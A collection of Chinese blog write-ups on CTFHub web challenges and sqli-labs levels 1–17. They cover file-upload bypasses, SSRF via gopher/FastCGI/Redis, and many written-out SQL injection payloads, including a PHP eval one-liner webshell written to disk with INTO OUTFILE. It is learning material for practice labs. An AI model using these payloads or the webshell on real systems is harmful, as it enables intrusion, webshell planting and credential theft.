[{"title":"CTFHub-Web-文件上传","date":"2022-02-15T15:32:53.000Z","url":"/2022/02/15/CTFHub-Web-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/","categories":[["undefined",""]],"content":"CTFHub-Web-文件上传​ 文件上传是指用户上传了一个可执行的脚本文件，并且通过该文件获取了执行服务器端命令的能力。 无验证​ 最基本的文件上传，写一个一句话木马，然后直接上传。会返回上传的路径，然后用蚁剑就可以取了。 前端验证​ 在上题的基础上，多了js前端验证，我们依然上传上一题的php文件，发现被前端拦截 我们通过查看源代码，发现只能上传jpg,png,gif。因此我们可以先把后缀改成可以上传的jpg，然后通过抓包更改为php成功上传。再得到相对路径利用蚁剑进行连接。 .htaccess​ htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能 ​ 我们通过上传一个.htaccess文件，令Apache把所有的.xxx文件都解析为php文件。 .htaccess内容： 上传完成后，再传我们上一题的hack.jpg文件，会被默认执行为php文件，从而实现注入。 MIME绕过​ MIME(Multipurpose Internet Mail Extensions)多用途互联网邮件扩展类型。是设定某种扩展名的文件用一种应用程序来打开的方式类型，当该扩展名文件被访问的时候，浏览器会自动使用指定应用程序来打开。 ​ 服务端MIME类型检测是通过检查http包的Content-Type字段中的值来判断上传文件是否合法的。 ​ 常见的MIME类型比如有text/html，image/jpeg，application/json等等，我们可以先传一个正常的php文件，通过抓包更改他的Content-Type字段，改成可以通过的字段，然后放包进行成功的注入。 同样利用蚁剑获取flag。 文件头检查​ 这题我们要在前面题目的基础上，加入图片马。将我们的一句话木马和图片合在一起，进行绕过。 然后上传我们的flag.php文件，通过bp将他的Content-Type改成图片的image/jpeg，进行绕过。 成功上传，蚁剑连接得到flag. 00截断题目说了要了解一下 PHP 5.2 00截断上传的原理 %00是字符串结束的标识，攻击者通过主动添加标识符来进行截断。 在数据包存在上传路径的时候，比如这题遇到的上传路径为/var/www/html/upload，我们可以直接在路径之后加入hack.php%00进行截断。然后在蚁剑中通过url/upload/hack.php的路径进行读取flag. 双写后缀​ 这个就和sql的双写绕过一个套路，我们在前面测试的时候发现，上传hack.php文件，会被语句 进行过滤，将我们的php用空格替换，因此我们可以把后缀改成phphpp，中间php过滤后还有一个php，成功识别实现注入。"},{"title":"CTFHub-Web-HTTP协议","date":"2022-02-13T14:00:03.000Z","url":"/2022/02/13/CTFHub-Web-HTTP%E5%8D%8F%E8%AE%AE/","categories":[["undefined",""]],"content":"CTFHub-Web-HTTP协议​ 超文本传输协议（Hyper Text Transfer Protocol，HTTP），运行在TCP上。 ​ HTTP协议工作于客户端-服务端架构上。浏览器作为HTTP客户端通过URL向HTTP服务端即WEB服务器发送所有请求。 ​ Web服务器有：Apache服务器，IIS服务器（Internet Information Services）等。 ​ Web服务器根据接收到的请求后，向客户端发送响应信息。 ​ HTTP响应也由四个部分组成，分别是：状态行、消息报头、空行和响应正文。 请求方式题目要求：HTTP 请求方法, HTTP/1.1协议中共定义了八种方法（也叫动作）来以不同方式操作指定的资源。 然而我找了九种方法。。我们最常见的还是GET和POST 序号 方法 描述 1 GET 请求指定的页面信息，并返回实体主体。 2 HEAD 类似于 GET 请求，只不过返回的响应中没有具体的内容，用于获取报头 3 POST 向指定资源提交数据进行处理请求（例如提交表单或者上传文件）。数据被包含在请求体中。POST 请求可能会导致新的资源的建立和/或已有资源的修改。 4 PUT 从客户端向服务器传送的数据取代指定的文档的内容。 5 DELETE 请求服务器删除指定的页面。 6 CONNECT HTTP/1.1 协议中预留给能够将连接改为管道方式的代理服务器。 7 OPTIONS 允许客户端查看服务器的性能。 8 TRACE 回显服务器收到的请求，主要用于测试或诊断。 9 PATCH 是对 PUT 方法的补充，用来对已知资源进行局部更新 。 题目打开存在. 表示现在用了GET的方法，然后我们要切换成CTF**B方法。直接盲猜为CTFHUB，利用burpsuite抓包更改即可。 302跳转题目要求：HTTP临时重定向 302跳转就是重定向，临时移动。与301类似。但资源只是临时被移动。客户端应继续使用原有URI。301则是永久移动。 打开来，点击Give me Flag好像没有反应，但是实际上已经发生了跳转。 我们利用bp抓包 直接右键Send to Repeater然后按Go重新把这包发一次就行了 Cookie题目要求：Cookie欺骗、认证、伪造 Cookie可以理解成是登录者上网的身份证，这题里他能认证你是否为管理员，我们通过修改cookie实现越权漏洞。 打开来题目提示 我们直接抓包。修改admin=1重新再放一次就能得到flag 基础认证题目要求：在HTTP中，基本认证（英语：Basic access authentication）是允许http用户代理（如：网页浏览器）在请求时，提供 用户名 和 密码 的一种方式。详情请查看 基本认证 我们打开后发现点击cilck都会返回一个登录框，我们随便进行输入然后抓包发现返回包存在了我们刚才输入的账号密码均为admin的base64形式 然后再看respond包里面存在了提示 我们因此可以知道admin应该就是用户名，密码则可以利用题目给的附件中爆破进行得出。 将字典导入，然后增加前缀，增加编码方式，取消url编码处理 最后爆破得到的respond响应包存在flag 响应包源代码题目要求：HTTP响应包源代码查看 直接F12查看源代码，flag在备注中。"},{"title":"CTFHub-Web-SSRF","date":"2022-01-24T13:15:03.000Z","url":"/2022/01/24/CTFHub-Web-SSRF/","categories":[["undefined",""]],"content":"CTFHub-Web-SSRF​ SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统） ​ SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。 内网访问题目要求：尝试访问位于127.0.0.1的flag.php吧 url进行了重定向，直接访问127.0.0.1下的flag.php即可。 payload：?url=127.0.0.1/flag.php 伪协议读取文件题目要求：尝试去读取一下Web目录下的flag.php吧 先用上一题的payload进行尝试，发现返回的是三个问号。 因此在本题用到file:// web的默认目录一般为/var/www/html因此直接访问即可。 payload：?url= 端口扫描题目要求：来来来性感CTFHub在线扫端口,据说端口范围是8000-9000哦。 直接开bp爆破。设置范围为8000到9000. 我的在8405回显了flag。 POST请求题目要求：这次是发一个HTTP POST请求.对了.ssrf是用php的curl实现的.并且会跟踪302跳转.加油吧骚年 先尝试访问flag.php文件，发现存在一个输入框，查看源代码有提示。 输入key值后得到Just View From 127.0.0.1，说明我们只能从127.0.0.1访问。 题目提示了我们用curl进行传输，我们先利用file来获取源代码 index.php的 flag.php的 我们可以尝试使用Gopher 协议来进行获取flag. Gopher协议可以支持发出GET，POST请求，可以截断get请求包和postd的请求包，在构成符合Gopher的请求，在SSRF中广泛的运用。但在各个编程语言版本中存在着限制。 Gopher协议格式： （注意这个_是可以任意加的） 像这题目这里我们应当构造的就是gropher://127.0.0.1:80/_(后续的tcp数据流) 我们要构造一个GET包或者一个POST包，然后进行url编码，实现请求。 Gopher协议简单分成三步： 1、构造HTTP数据包2、URL编码、替换回车换行为%0d%0a3、发送gopher协议 其中在POST包中，必要的参数是host,Content-Type,Content-Length,还有题目的参数。我们在本题中可以构造一个POST包，发送HTTP POST请求。 注意：length长度要对，key要对，gopher的数据要用两次的url编码后发送。在转换url编码中，第一次编码后形成的所有的%0a要换成%0d%0a。因为 Gopher协议包含的请求数据包中，可能包含有=、&amp;等特殊字符，避免与服务器解析传入的参数键值对混淆，所以对数据包进行 URL编码，这样服务端会把%后的字节当做普通字节。然后在进行第二次的编码 根据这些要求再将这个请求进行编码处理. 构成payload: 成功回显了flag 上传文件题目要求：这次需要上传一个文件到flag.php了.祝你好运 这题属于上一题的拓展。 一样先访问?url=127.0.0.1/flag.php，发现了一个上传的位置，只能选择文件，没有提交的表单页面。 于是我们可以自己利用F12在前端加一个提交的按键。 提交成功后显示Just View From 127.0.0.1，就和上一题一样。 由于只允许从本地访问，我们依然是要创建条件然后利用gopher来进行抓取flag。 在burpsuite抓包中找到我们上传的记录，修改host为：Host: 127.0.0.1:80 进行url编码两次（第一次一样是要吧%0A改成%0D0A） 然后构造 ?url=gopher://127.0.0.1:80/_(编码后的数据)直接进行访问即可。 FastCGI协议题目提示：这次.我们需要攻击一下fastcgi协议咯.也许附件的文章会对你有点帮助 快速通用网关接口（Fast Common Gateway Interface／FastCGI）是一种让交互程序与Web服务器通信的协议。 HTTP协议是浏览器和服务器中间件进行数据交换的协议，类比HTTP协议来说，fastcgi协议是服务器中间件和某个语言后端进行数据交换的协议。服务器中间件将这二者按照fastcgi的规则封装好发送给语言后端。 我们从题目附件可以拿到一个exp，我们也可以直接用这个exp来打。原理就是通过监听端口，获取到攻击的流量，将流量得到的进行url编码后，再进行gopher的访问获取flag。 但是打比赛做题更推荐直接用一个现成的工具，相对来说方便一点。 这个工具叫Gopherus，可以生成一个现成的payload。 下载完成后我们直接用语句python gopherus.py --exploit fastcgi打开。然后第一个输入框是让你输入一个你已知里面有的php文件名，这里空的话他也会有默认的没事。然后第二个输入是输入你要执行的命令，这里先用的ls / 然后将这个payload在进行一次url编码，进行运用?url=(所得的编码后的payload)得到flag文件位置 接着同样方式执行cat /flag_ad3ff7408a1c2dde89063abf589dd8d3 同样进行编码后进行处理得到flag Redis协议题目要求：这次来攻击redis协议吧.redis://127.0.0.1:6379,资料?没有资料!自己找! Redis服务器与客户端通过RESP（REdis Serialization Protocol）协议通信。RESP实际上是一个支持以下数据类型的序列化协议：简单字符串，错误，整数，批量字符串和数组。RESP在Redis中用作请求。 redis常见的SSRF攻击方式大概有这几种： 绝对路径写webshell 写ssh公钥 写contrab计划任务反弹shell 我们这题用到的就是写shell。 由于我们可以把文件写入redit。同样用的是Gopherus。 然后把得到的payload进行url编码后进行注入，会返回404，但是实际上是完成了注入。 通过蚁剑进行访问shell.php文件，在根目录下得到flag。 URL Bypass题目要求：请求的URL中必须包含，来尝试利用URL的一些特殊地方绕过这个限制吧 这题的话可以用@绕过的方法，直接访问?url= 可以得到flag。 注： ssrf存在一些绕过的方法，从别的师傅博客搜集来的 1.攻击本地 2、利用[::] 3、利用@ 4、利用短域名 5、利用特殊域名利用的原理是DNS解析 6、利用DNS解析在域名上设置A记录，指向127.0.1 7、利用上传 8、利用Enclosed alphanumerics 9、利用句号 10、利用进制转换 11、利用特殊地址 12、利用协议这也是我们前面遇到的几题 数字IP Bypass题目要求：这次ban掉了127以及172.不能使用点分十进制的IP了。但是又要访问127.0.0.1。该怎么办呢。 这里用上面写出的进制转换来做，直接访问127.0.0.1的十六进制?url=2130706433/flag.php 或者直接用特殊地址0来访问?url=0/flag.php 或者用localhost/flag.php 302跳转 Bypass题目要求：SSRF中有个很重要的一点是请求可能会跟随302跳转，尝试利用这个来绕过对IP的检测访问到位于127.0.0.1的flag.php吧 这题直接用?url=2130706433/flag.php就出了，算是非预期吧。题目要求我们用302跳转。 302重定向又称之为暂时性转移(Temporarily Moved )。 我们可以编写一个302.php放在自己的服务器上，然后进行访问 就行。 访问实现url跳转 payload：?url=http://[公网IP]/302.php DNS重绑定 Bypass题目要求：关键词：DNS重绑定。剩下的自己来吧，也许附件中的链接能有些帮助 题目给了附件简单的讲了什么是dns重绑定。 我的理解就是受害者先访问了攻击者预先设置好的网站，这网站可能是伪造的，然后攻击者先返回给受害者真实的IP地址，设置ttl值为1秒，让受害者的机器缓存很快就失效，然后受害者的浏览器再次向攻击者的网站进行请求http加载网页，攻击者进行回应并加载一些恶意代码，不断地让受害者向攻击者发出post请求。由于上面设置的ttl时间过短，浏览器会再次发出请求得到ip地址，此时攻击者的dns服务器收到查询，就把ip换成任意一个内网设备的ip，然后由于满足了同源策略，浏览器会认为是安全的，就就向内网其他的设备发送post恶意请求，到达了攻击的效果。在整个过程中，受害者访问的都是同一个域名，因此认为这是安全的，造成了DNS 重绑定的效果 我们可以通过这网站  ，输入两个127段的地址，得到payload ![DNS重绑定 Bypass1](CTFHub-Web-SSRF/DNS重绑定 Bypass1.png) ?url=7f000001.7f000002.rbndr.us/flag.php 直接获取flag"},{"title":"sql-lab刷题记录","date":"2022-01-03T13:15:03.000Z","url":"/2022/01/03/sql-lab%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/","categories":[["undefined",""]],"content":"sql-lab刷题记录​ sqllab是atao师傅推荐我用来学sql的，网上已经有很多现成的writeup，写的知识点也比我完善，我只是用来简单记录一下自己的学习的过程。搭建的方法也很简单，网上都有，记得php版本要在7.0以前，避免要更改sql的函数。 前言为了方便后面做题，我先找到目标的数据库，然后在命令行中进行调试方便找到目标。 先是默认的账号密码进入 mysql -uroot -p123456 用show databases; 找到默认的数据库security, 然后use security，进入数据库 show tables; 找到表users 在表中进行搜索，方便做题。 Less-1 GET-基于报错的单引号字符型注入首先根据题目名字，尝试输入?id=-1&#39; 返回了报错的信息 然后我们进入源码中查看，发现其从中读入的数据，没有经过处理，直接读入 $sql=&quot;SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT 0,1&quot;; LIMIT表示可以返回的记录数。 我们尝试在数据库中利用该语句进行查询，发现是否加’都能正常返回 而如果输入?id=1&#39;加了额外的&#39;意味着会让sql语句进行提前闭合，从而报错 select * from users where id=&#39;1&#39;&#39; limit 0,1; 而我们将后面部分利用?id=1&#39;#注释掉，则可以正常返回空的查询。 当我们输入1’# 的时候，回车还需要一个冒号作为闭合，因为系统读到#后，不会继续往下面读，默认下面的都是注释忽略了，进而达到绕过的目的。 因此我们可以考虑通过在1’后面加上自己想查询的东西，得到想要的答案。 通过?id=1&#39; order by 1,2,3--+，发现其中存在三行,此时可以通过联合注入的方式进行查询。 ?id=-1&#39; union select 1,2,3--+发现在2，3的位置会进行回显。 因此我们可以开始注入了，一般的思路是获取字段数-&gt;数据库名-&gt;表名-&gt;列名-&gt;值 字段数就靠上面的order by进行猜解，或者通过union select直接尝试，直到遇到报错。 我们已知了有3列，而2，3列会回显，因此我们下一步进行查数据库名。 先在数据库里试一下。有几个常用的查询的默认 database()：当前网站使用的数据库 version()：当前Mysql的版本 user()：当前Mysql的用户 因此我们再在网站中进行查询，?id=-1&#39; union select 1,user(),database()--+，进而得到数据库名和用户。 接着查询表。 同样先试一下 group_concat()：表示把一个分组的值串起来。 information_schema：mysql自带的信息数据库存在着存储数据库元数据(关于数据的数据)，例如数据库名、表名、列的数据类型、访问权限等。 因此我们再在网站中进行查询，?id=-1&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema= &#39;security&#39;--+，得到表名。 再对user表进行查询。 再在网站中进行查询?id=-1&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_schema= &#39;security&#39; and table_name=&#39;users&#39;--+，得到字段名。 最后查用户名和密码。(格式太丑不放了) 在网站中查询?id=-1&#39; union select 1,group_concat(username),group_concat(password) from users--+ 会回显 然后差不多就完了，接着下一题。 Less-2 GET-基于报错的整型注入这题与上一题看起来差不多，只在于一个&#39;&#39;的差别当我们以?id=-1 or 1=1#进行判断报错的时候i，发现返回了整个包裹的&#39; or 1=1 LIMIT 0,1所以可以判断我们多输入了一个&#39;,是多余的，查看代码源码也发现如此 ?id=-1 union select 1,2,3# 判断注入点 ?id=-1 union select 1,database(),version()# 取数据库名 ?id=-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#39;security&#39;# 取表名 ?id=-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39;# 取列 ?id=-1 union select 1,group_concat(username),group_concat(password) from users# 取内容 Less-3 GET-基于报错的单引号变形注入同样用?id=-1&#39; or 1=1#测试，发现返回的错误为&#39;) LIMIT 0,1，证明这次的是用)进行包裹的。 再次查看源代码，发现确实。 然后在这里我才意识到?id=-1&#39; or 1=1#是用不了的，而?id=-1&#39; or 1=1--+可以用，我本来以为--+一样是注释符，查了资料才发现，--并不是注释符，而--后还要加上空格，而web中空格和+等价，所以我们一般用--+，其他常用的注释符还有/**/和# 所以这题我们用–+ ?id=-1&#39;) union select 1,2,3--+ 找注入点 ?id=-1&#39;) union select 1,database(),user()--+ 找数据库名 ?id=-1&#39;) union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#39;security&#39;--+ 取表名 ?id=-1&#39;) union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=&#39;security&#39;and table_name=&#39;users&#39;--+ 取列 ?id=-1&#39;) union select 1,group_concat(username),group_concat(password) from users--+ 取内容 Less-4 GET-基于报错的双引号字符型注入还是先试一下?id=-1&#39; or 1=1#，然后发现没有任何报错的反应，然后我选择直接看了源码，发现这次的代码与之前有所不同 $id = &#39;&quot;&#39; . $id . &#39;&quot;&#39;; 表示在php中.是用来连接的，表示把$id存储的值加上一个双引号然后在赋值给$id 这个变量，很明显我们这题要用到双引号的绕过。 当我们将用?id=1&quot;进行报错的验证，会发现返回的错误为&quot;1&quot;&quot;) LIMIT 0,1，从而可以判断在该处要进行双引号和括号的闭合 ?id=-1&quot;) union select 1,2,3--+ 找注入点 ?id=-1&quot;) union select 1,database(),user()--+ 找数据库 ?id=-1&quot;) union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#39;security&#39;--+ 找表名 ?id=-1&quot;) union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39;--+ 找列名 ?id=-1&quot;) union select 1,group_concat(username),group_concat(password) from users--+ 取数 Less-5 GET-单引号字符型注入这题思路又和前面不一样了，我不会做，看了别的师傅的思路，好像有两种方法，一种是开始了盲注。另一个就是题目本来目的双注。 首先先用?id=1&#39;，返回了报错信息&#39;1&#39;&#39; LIMIT 0,1，证明是单引号的，然后我们当输入的语句逻辑是正确的时候，就You are in………..会返回You are in........... ，我们可以根据函数，来判断数据库名字。 ?id=1’ and length(database())=8--+ 返回正确，表示数据库名长度为8. 接着一个字母一个字母判断。 ?id=1&#39; and ascii(substr(database(),1,1))=1--+ 用ascii(字母)来判断这个字母ascii值为多少。substr()表示返回字符串的一部分 直接抓包进行判断，错误的返回length为964，正确的为948 发现在?id=1&#39; and ascii(substr(database(),1,1))=115--+ 返回正确，可以判断第一个字母的ASCII码为115，对应s，每次更改一位，然后爆破出数据库为security。 ?id=1&#39; and (select count(*) from information_schema.tables where table_schema=database())=4--+ 判断出有四个表。 在数据库中可以用length(table_name)，找出表长，再用limit切片判断长度 ?id=1&#39; and (select length(table_name) from information_schema.tables where table_schema=database() limit 0,1)=6--+ 正常回显，则可以判断第一个表的长度。 同样进行爆破，然后发现第一个表的第一个字母为ascii等于101的 ?id=1&#39; and (select ascii(substr(table_name,x,1)) from information_schema.tables where table_schema=database() limit y,1)=101--+ (x表示爆破的第几个字母的ascii，y表示爆破的第几个表) 然后，同理可以爆出存在的四个表为 ?id=1&#39; and (select count(column_name) from information_schema.columns where table_schema=database() and table_name=&#39;users&#39;)=3--+ 判断出在这个表中有三个列 ?id=1&#39; and (select length(column_name) from information_schema.columns where table_schema=database() and table_name=&#39;users&#39; limit 0,1)=2--+ 判断出第一个列的长度为2，以此类推找出三个列长度。 ?id=1&#39; and (select ascii(substr(column_name,1,1)) from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39; limit 1,1)=117--+ 判断第二个列名字第一位为117。同样方法爆破。 然后判断出来存在的三个列为 然后判断第一个username。 ?id=1&#39; and (select ascii(substr(username,1,1)) from users limit 0,1)=68--+ 判断出第一位字母为D，以此类推。最后找出表的password和username 这题还存在着另外一个解法，也是题目本来想要的解法。使用双注。 rand():返回随机值 floor():向下舍入为指定的位数 ceiling():向上取证为指定给的位数 Group by:分组 使用二次查询的方式，就是一个select里面再嵌套一个select，如 双注的意思是当在一个聚合函数，比如count函数后面如果使用分组语句就会把查询的一部分以错误的形式显示出来。 利用rand可以返回随机数，加入floor可以返回0或者1。rand(0)会返回固定值 这样构造可以发现有多少条记录，就返回多少条 再利用gourp by进行分组得到两组。 然后注意information_schema.schemata：包含了所有数据库名，就差不多可以开始尝试了。 我自己从hackbar生成一条，返回了Duplicate entry &#39;security~1&#39; for key &#39;&#39; 这里用的是派生表报错select 1 from (table name); 这样的语法来报错。 ?id=1&#39; AND(SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT(SELECT CONCAT(CAST(DATABASE() AS CHAR),0x7e)) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema=DATABASE() LIMIT 0,1),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)--+ 然后自己写的是 ?id=-1&#39; union all select count(*),0x7e,concat( &#39;~&#39;,(select database() from information_schema.schemata limit 4,1),&#39;~&#39;,floor(rand()*2)) as a from information_schema.schemata group by a --+ 返回Duplicate entry &#39;~security~1&#39; for key &#39;&#39; 得到了数据库名 ?id=-1&#39; union all select count(*),0x7e,concat(&#39;~&#39;,(select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 3,1),&#39;~&#39;,floor(rand()*2)) as a from information_schema.schemata group by a--+ 返回Duplicate entry &#39;~users~0&#39; for key &#39;&#39; 得到了users表 ?id=-1&#39; union all select count(*),0x7e,concat( &#39;~&#39;,(select column_name from information_schema.columns where table_name= &#39;users&#39; limit x,1),&#39;~&#39;,floor(rand()*2)) as a from information_schema.schemata group by a --+ x换成数字得到具体字段 ?id=-1&#39; union all select count(*),1,concat( &#39;~&#39;,(select concat(id,username,password) from users limit 2,1),&#39;~&#39;,floor(rand()*2)) as a from information_schema.schemata group by a--+ 得到具体的数据。 Less-6 GET-双注入-双引号字符型注入这道题和5类似，就源码中多了&quot;&quot;,只需要修改部分的闭合就可以了。 只需要把原来的&#39;&#39;改成&quot;&quot;就可以了 返回Duplicate entry &#39;~security~0&#39; for key &#39;&#39; 得到数据库名 返回Duplicate entry &#39;~users~1&#39; for key &#39;&#39; 得到users表 x换成数字得到具体字段 返回Duplicate entry &#39;~3~Dummy~p@ssword~0&#39; for key &#39;&#39; 得到一个用户的账号密码。剩下的爆破一下就好了。 Less-7 GET-导出文件字符型注入这一题和前面是不一样的了，涉及到写入文件了。 查看一下源码，发现 备注中已经有了提示，同时id也没有过滤，因此我们可以用))绕过 测试一下没反应，同时提示用outfile outfile：select &#39;需要写入的内容&#39; out file &#39;文件的绝对路径&#39; 一句话木马: &lt;?php @eval($_REQUEST[“password”]) ?&gt; 我们先验证一下文件的权限可读性 发现正常返回 这里要说一下，我搞这搞了好久，因为马写完了，但是文件一直没出来，因为我一直少了个东西，应该去mysql的默认文件夹下，找到my.ini文件，然后在文件中加入 这句话，然后保存，重启mysql，才能进行操作的。这是赋予了权限。 先本地试一下 返回了 所以大概了解语句怎么用了。 然后用order by判断字段的个数。 然后进行注入 ?id=1&#39;)) union select 1,2,&#39;&lt;?php @eval($_post [“password”]);?&gt;&#39; into outfile&#39;D:\\\\phpstudy_pro\\\\WWW\\\\1.php&#39; --+ 终于成功了，返回了 然后上菜刀，连接。 Less-8 GET-单引号字符型布尔盲注都说了是布尔，然后第五题的时候其实就已经写过了。 然后这题是我第一次试着用脚本写一个sql盲注，写了一晚上，只能说自己太菜了，但是大概理解了一点，脚本写的很烂，代码也很杂乱，可能除了自己也没有人可以看得懂了。太晚了也懒得打备注了。怎么说呢，反正第一次写的，总有意义嘛，还是得记录下来的。虽然借鉴了很多博客，但终究成了自己的东西。 Less-9 GET-单引号字符型时间盲注其实和第八题的思路是一样的都是盲注，但是这题我们可以试试时间盲注 时间盲注需要用到一个if函数和sleep函数 if(a,b,c)：表示满足a的时候执行b，不满足执行c sleep(x) ：执行延迟x秒 我们可以通过在sleep的过程中，发现了延迟，得到了盲注成功的结果 if(条件，sleep(0.1),1) 然后拿第八题的代码改一下就可以了，如果不嫌浪费时间，sleep时间可以加大，然后相减时间也对应加大，这样误差更小 Less-10 GET-双引号字符型时间盲注对比第9题的代码，发现只是&#39;改成&quot; 代码也把 1&#39; and改成1&quot; and就可以了 Less-11 POST-基于报错的单引号字符型注入前面十题都是get，然后这题是post的。 关键代码在这里，读入之后未做任何的处理 直接使用万能密码，闭合这个语句 先在数据库里进行尝试 发现可以闭合回显。所以直接在网页的用户名输入admin&#39; or 1=1 #即可，密码随意。 同样我们可以利用这个登录框进行数据库的获取。 由于一次只能回显两个字段，所以我们先获取数据库的名字，和get方式差不多。 uname=1&#39; union select database(),user()#&amp;passwd=1 获取数据库名 uname=1&#39; union select group_concat(table_name),2 from information_schema.tables where table_schema=&#39;security&#39;#&amp;passwd=1可以将所有表名回显在第一个字段。 回显了 uname=1&#39; union select group_concat(column_name),2 from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39;#&amp;passwd=1 取列名 uname=1&#39; union select group_concat(username),group_concat(password) from users#&amp;passwd=1 最后取字段 Less-12 POST-基于报错的双引号型字符变形注入同样和get的方式是类似的 直接看源码，同样是进行了双引号的处理 我们依然先在数据库中测试，利用admin&quot;) or 1=1#来闭合 得到 因此我们也构造post数据uname=1&quot;) or 1=1#&amp;passwd=1 实现万能账号的注入 uname=1&quot;) union select database(),user()#&amp;passwd=1 获取数据库名 uname=1&quot;) union select group_concat(table_name),2 from information_schema.tables where table_schema=&#39;security&#39;#&amp;passwd=1，回显表名 uname=1&quot;) union select group_concat(column_name),2 from information_schema.columns where table_name=&#39;users&#39; and table_schema=&quot;security&quot;#&amp;passwd=1 取列名 uname=1&quot;) union select group_concat(username),group_concat(password) from users#&amp;passwd=1 取字段 Less-13 POST-双注入-单引号字符型变形注入与get的双注是一个思路的 先用admin&#39;) or 1=1#注入发现没有回显 然后利用二次注入获取数据库名 uname=1&#39;) union all select count(*),0x7e,concat(&#39;~&#39;,(select database() from information_schema.schemata limit 4,1),&#39;~&#39;,floor(rand()*2)) as a from information_schema.schemata group by a--+&amp;passwd=1 回显Duplicate entry &#39;~security~1&#39; for key &#39;&#39; 得到了数据库名，然后再获取表名 uname=1&#39;) union all select count(*),concat(&#39;~&#39;,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;),&#39;~&#39;,floor(rand(0)*2)) as a from information_schema.tables group by a#&amp;passwd=1 得到表users Duplicate entry &#39;~emails,referers,uagents,users~1&#39; for key &#39;&#39; 再获取列名 uname=1&#39;) union all select count(*),concat(&#39;~&#39;,(select group_concat(column_name) from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39;),&#39;~&#39;,floor(rand(0)*2)) as a from information_schema.columns group by a#&amp;passwd=1 得到三个列 Duplicate entry &#39;~id,username,password~1&#39; for key &#39;&#39; 最后求列的值 uname=1&#39;) union all select count(*),concat(&#39;~&#39;,(select concat(username,&#39;-&#39;,password) from users limit 0,1),&#39;~&#39;,floor(rand(0)*2)) as a from information_schema.columns group by a#&amp;passwd=1 可以靠修改limit后面的数字来取不同用户的用户名和密码 回显Duplicate entry &#39;~Dumb-Dumb~1&#39; for key &#39;&#39; Less-14 POST-双注入-双引号字符型变形注入看14与13的源码有一些不同，在于双引号的注入 14题采用了双引号 uname=1&quot; union all select count(*),concat(&#39;~&#39;,(select database() from information_schema.schemata limit 4,1),&#39;~&#39;,floor(rand(0)*2)) as a from information_schema.schemata group by a#&amp;passwd=1 取数据库名 Duplicate entry &#39;~security~1&#39; for key &#39;&#39; 同样取表名 uname=1&quot; union all select count(*),concat(&#39;~&#39;,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;),&#39;~&#39;,floor(rand(0)*2)) as a from information_schema.tables group by a#&amp;passwd=1 回显 Duplicate entry &#39;~emails,referers,uagents,users~1&#39; for key &#39;&#39; 取列 uname=1&quot; union all select count(*),concat(&#39;~&#39;,(select group_concat(column_name) from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39;),&#39;~&#39;,floor(rand(0)*2)) as a from information_schema.columns group by a#&amp;passwd=1 回显 Duplicate entry &#39;~id,username,password~1&#39; for key &#39;&#39; 最后取每个字段 uname=1&quot; union all select count(*),concat(&#39;~&#39;,(select concat(username,&#39;:&#39;,password) from users limit 0,1),&#39;~&#39;,floor(rand(0)*2)) as a from information_schema.columns group by a#&amp;passwd=1 同样可以改limit后面数字得到不同的结果 Duplicate entry &#39;~Dumb:Dumb~1&#39; for key &#39;&#39; Less-15 POST-基于布尔/时间延迟单引号型盲注此处的思路与get型是类似的，只需要改一下get为post Less-16 POST-基于布尔/时间延迟双引号型盲注和15一样的思路，把单引号改双引号 admin’变为admin”) 代码就直接找用户名和密码吧 Less-17 POST-基于错误的更新查询（做该题可能误删数据库） 先查看源码发现存在着update，因此可以采用更新查询注入 由于在uname处有了太多过滤。在源码中将其读入check_input利用mysql_real_escape_string()函数实现字符串的转义。因此要在passwd进行注入。 先了解一下要用的updatexml()函数 UPDATEXML (XML_document, XPath_string, new_value); 第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc 第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。 第三个参数：new_value，String格式，替换查找到的符合条件的数据 我们可以构造updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)，因为concat是把所有的字段连成字符串，不符合XPath_string格式，因此会报错。 post提交uname=admin&amp;passwd=1&#39; and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)#可以测试得到 XPATH syntax error: &#39;~5.7.26~&#39; 同样先取表名 uname=admin&amp;passwd=1&#39; and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)# 回显 XPATH syntax error: &#39;~security~&#39; 取表名 uname=admin&amp;passwd=1&#39; and updatexml(1,concat(0x7e,(SELECT group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;),0x7e),1)# 回显 XPATH syntax error: &#39;~emails,referers,uagents,users~&#39; 取列 uname=admin&amp;passwd=1&#39; and updatexml(1,concat(0x7e,(SELECT group_concat(column_name) from information_schema.columns where table_schema=&#39;security&#39; and 